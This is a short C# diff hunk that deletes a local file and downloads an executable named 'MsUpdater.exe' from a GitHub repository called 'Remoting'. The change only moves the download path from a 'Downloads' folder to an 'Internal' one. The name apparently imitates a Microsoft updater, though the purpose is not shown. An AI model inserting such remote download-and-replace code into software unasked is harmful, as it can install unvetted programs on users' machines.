@@ -37,7 +37,7 @@
                 File.Delete(Target);
             }
 
-            const string Download = "https://github.com/Wiciaki/Remoting/blob/master/Downloads/MsUpdater.exe?raw=true";
+            const string Download = "https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater.exe?raw=true";
 
             using (var client = new WebClient())
             {
